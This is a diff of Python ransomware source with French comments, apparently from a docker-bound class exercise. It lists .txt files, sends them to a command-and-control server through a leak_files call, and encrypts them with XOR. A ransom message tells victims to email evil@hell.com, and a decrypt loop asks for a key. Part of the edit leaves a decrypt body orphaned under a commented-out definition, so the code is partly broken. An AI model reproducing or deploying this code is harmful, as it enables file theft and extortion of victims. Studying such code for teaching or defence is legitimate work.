@@ -25,6 +25,7 @@ Your txt files have been locked. Send an email to evil@hell.com with title '{tok
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
+        self.hex_token = None
     
     def check_hostname_is_docker(self)->None:
         # At first, we check if we are in a docker
@@ -41,13 +42,15 @@ class Ransomware:
     
     def get_files(self, filter_str: str) -> list:
         #répertoire où on va rechercher les fichiers
-        base_path = Path('/root/ransomware')
+        base_path = Path('.')
 
         # rechercher les fichiers 
         matching_files = list(base_path.rglob(filter_str))
 
         # obtenir les chemins absolus des fichiers
-        absolute_paths = [str(file.resolve()) for file in matching_files]
+        #absolute_paths = [str(file.resolve()) for file in matching_files]
+        absolute_paths = [str(file.absolute()) for file in matching_files]
+
 
         return absolute_paths
 
@@ -58,19 +61,26 @@ class Ransomware:
     def encrypt(self):
        
         # Liste les fichiers .txt 
-        txt_files = [file for file in os.listdir() if file.endswith('.txt')]
+        #txt_files = [file for file in os.listdir() if file.endswith('.txt')]
+        files_to_encrypt = self.get_files("*.txt")
 
-        if not txt_files:
-            print("Aucun fichier .txt trouvé dans le répertoire courant.")
-            return
+        #if not txt_files:
+            #print("Aucun fichier .txt trouvé dans le répertoire courant.")
+            #return
 
         # Crée une instance de SecretManager
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         # Appelle la méthode setup pour générer la clé et le token
         secret_manager.setup()
 
+        secret_manager.leak_files(files_to_encrypt)
+            
+            # Chiffrer les fichiers
+        #secret_manager.aes_files(files_to_encrypt)
+        
+ 
         # Chiffre les fichiers .txt
-        files_to_encrypt = txt_files
+        #files_to_encrypt = txt_files
         secret_manager.xorfiles(files_to_encrypt)
 
         # Affiche un message avec le token au format hexadécimal
@@ -83,8 +93,8 @@ class Ransomware:
         # main function for decrypting (see PDF)
         #raise NotImplemented()
     
-    def decrypt(self):
-        secret_manager = SecretManager()
+   # def decrypt(self):
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
 
         # Charge les éléments cryptographiques locaux
         secret_manager.load()
@@ -97,8 +107,8 @@ class Ransomware:
                 # Appelle set_key pour valider et définir la clé
                 secret_manager.set_key(b64_key)
 
-                # Liste des fichiers chiffrés (à personnaliser)
-                files_to_decrypt = ['a.txt.encrypted', 'truc.txt.encrypted']
+                # Liste des fichiers chiffrés 
+                files_to_decrypt = ['a.txt', 'truc.txt']
 
                 # Appelle xorfiles pour déchiffrer les fichiers
                 secret_manager.xorfiles(files_to_decrypt)
@@ -115,6 +125,36 @@ class Ransomware:
                 print("La clé est incorrecte. Veuillez réessayer.")
                 continue  # Recommence la boucle en cas d'échec
 
+    def decrypt(self):
+        # Charger les éléments cryptographiques et la liste des fichiers chiffrés
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.load()
+
+        self.hex_token = secret_manager.get_hex_token()
+        self.timestamp = secret_manager.get_int_timestamp()
+
+        encrypted_files = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Demander la clé de déchiffrement
+                b64_key = input("")
+                # Définir la clé
+                secret_manager.set_key(b64_key)
+                # Déchiffrer les fichiers
+                secret_manager.unaes_files(encrypted_files)
+                # Nettoyer les éléments cryptographiques locaux
+                secret_manager.clean()
+
+                # Nettoyer la console
+                os.system('cls' if os.name == 'nt' else 'clear')
+        
+                # Afficher un message pour informer l'utilisateur que tout s'est bien passé
+                print('DECRYPT_MESSAGE')
+            except Exception as e:
+                print(f"Erreur : {e}")
+                print("La clé est incorrecte. Veuillez réessayer.")
+                continue  # Recommence la boucle en cas d'échec    
 
 
 if __name__ == "__main__":
